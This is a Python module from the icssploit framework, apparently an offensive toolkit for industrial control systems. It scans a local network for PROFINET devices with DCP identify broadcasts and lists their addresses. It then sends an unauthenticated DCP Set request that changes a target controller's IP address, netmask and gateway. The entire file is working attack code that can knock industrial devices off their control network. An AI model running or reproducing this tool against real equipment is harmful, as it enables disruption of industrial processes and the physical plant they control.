from icssploit import (
    exploits,
    print_success,
    print_status,
    print_table,
    print_error,
    validators,
)
import threading
from icssploit.protocols.pn_dcp import *
from scapy.arch import get_if_hwaddr
from scapy.sendrecv import sendp, sniff


TABLE_HEADER = ['Device Name', 'Device Type', "MAC Address", "IP Address", "Netmask", "GateWay"]
PROFINET_BROADCAST_ADDRESS_1 = '01:0e:cf:00:00:00'
PROFINET_BROADCAST_ADDRESS_2 = "28:63:36:5a:18:f1"
PROFINET_DEVICES = []


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'profinet device ip setup',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>'  # icssploit module
        ],
        'description': 'Setup target ip address with PROFINET-DCP protocol.',
        'references': [
        ],
    }

    nic = exploits.Option('eth0', 'Interface Name e.g eth0, en0')
    target = exploits.Option('40:6c:8f:ff:ff:ff', 'Target mac address, e.g. 40:6c:8f:ff:ff:ff',
                             validators=validators.mac)
    target_ip = exploits.Option('192.168.1.100', 'IP Address to set', validators=validators.ipv4)
    target_netmask = exploits.Option('255.255.255.0', 'Network mask to set', validators=validators.ipv4)
    target_gateway = exploits.Option('0.0.0.0', 'Gateway to set', validators=validators.ipv4)
    timeout = exploits.Option(3, 'Timeout for response', validators=validators.integer)
    verbose = exploits.Option(0, 'Scapy verbose level, 0 to 2', validators=validators.integer)
    sniff_mac_address = None
    sniff_finished = threading.Event()
    result = []

    def sniff_answer(self):
        self.sniff_finished.clear()
        response = sniff(iface=self.nic, filter="ether dst host %s" % self.sniff_mac_address, timeout=self.timeout)
        self.result = []
        for i in range(len(response)):
            pkt = response[i]
            if pkt[Ether].dst == self.sniff_mac_address:
                Device_Name = ''
                Device_Type = ''
                MAC_Address = pkt[Ether].src
                IP_Address = ''
                Netmask = ''
                GateWay = ''
                if pkt.haslayer(PNDCPIdentDeviceNameOfStationResponseBlock):
                    Device_Name = pkt[PNDCPIdentDeviceNameOfStationResponseBlock].NameOfStation
                if pkt.haslayer(PNDCPIdentDeviceManufacturerSpecificResponseBlock):
                    Device_Type = pkt[PNDCPIdentDeviceManufacturerSpecificResponseBlock].DeviceVendorValue
                if pkt.haslayer(PNDCPIdentIPParameterResponseBlock):
                    IP_Address = pkt[PNDCPIdentIPParameterResponseBlock].IPaddress
                    Netmask = pkt[PNDCPIdentIPParameterResponseBlock].Subnetmask
                    GateWay = pkt[PNDCPIdentIPParameterResponseBlock].StandardGateway
                self.result.append([Device_Name, Device_Type, MAC_Address, IP_Address, Netmask, GateWay])
        self.sniff_finished.set()

    def exploit(self, target_mac):
        packet = Ether(src=self.sniff_mac_address, dst=target_mac, type=0x8892) / \
                 ProfinetIO(frameID=0xFEFD) / PNDCPHeader(ServiceID=4, ServiceType=0,
                                                          DCPBlocks=[PNDCPSetRequest(Option=0x01, SubOption=0x02)])
        packet[PNDCPHeader].DCPBlocks[0].DCPBlock = PNDCPSetIPParameterRequestBlock(
            IPaddress=self.target_ip, Subnetmask=self.target_netmask, StandardGateway=self.target_gateway
        )
        sendp(packet, iface=self.nic)

    def _send_scan_packet(self, target_mac):
        packet = Ether(src=self.sniff_mac_address, dst=target_mac, type=0x8892) / ProfinetIO(frameID=0xFEFE) / \
                 PNDCPHeader(ServiceID=5, ServiceType=0, DCPBlocks=[PNDCPIdentRequest()])
        sendp(packet, iface=self.nic)

    def scan_target_ip(self, target_mac):
        p = threading.Thread(target=self.sniff_answer)
        p.setDaemon(True)
        p.start()
        self._send_scan_packet(target_mac)
        self.sniff_finished.wait(self.timeout + 1)
        unique_device = [list(x) for x in set(tuple(x) for x in self.result)]
        print_table(TABLE_HEADER, *unique_device)
        print('\n')

    def command_scan(self, *args, **kwargs):
        conf.verb = self.verbose
        self.sniff_mac_address = get_if_hwaddr(self.nic)
        p = threading.Thread(target=self.sniff_answer)
        p.setDaemon(True)
        p.start()
        self._send_scan_packet(target_mac=PROFINET_BROADCAST_ADDRESS_1)
        self._send_scan_packet(target_mac=PROFINET_BROADCAST_ADDRESS_2)
        self.sniff_finished.wait(self.timeout + 1)
        unique_device = [list(x) for x in set(tuple(x) for x in self.result)]
        print_table(TABLE_HEADER, *unique_device)
        print('\n')

    def run(self):
        conf.verb = self.verbose
        self.sniff_mac_address = get_if_hwaddr(self.nic)
        self.scan_target_ip(self.target)
        if len(self.result) == 0:
            print_error("Didn't find any device, please check target mac address.")
            return
        print_status("Please make sure target device info is correct.")
        print_status("Do you want setup target with\n ip address: %s\n network mask: %s\n gateway:%s\n" % (
            self.target_ip, self.target_netmask, self.target_gateway
        ))
        ans = raw_input("Y/y to confirm, other to cancel.\n:")
        if ans.upper() == "Y":
            self.exploit(target_mac=self.target)
            self.scan_target_ip(self.target)
            # TODO: need some other method to check setup is success or not.
            if len(self.result) == 0:
                print_error("Setup target ip failed.")
                return

            if self.result[0][3] != self.target_ip \
                    or self.result[0][4] != self.target_netmask \
                    or self.result[0][5] != self.target_gateway:
                print_error("Setup target ip failed.")
                return
            else:
                print_success("Setup target ip succeed")


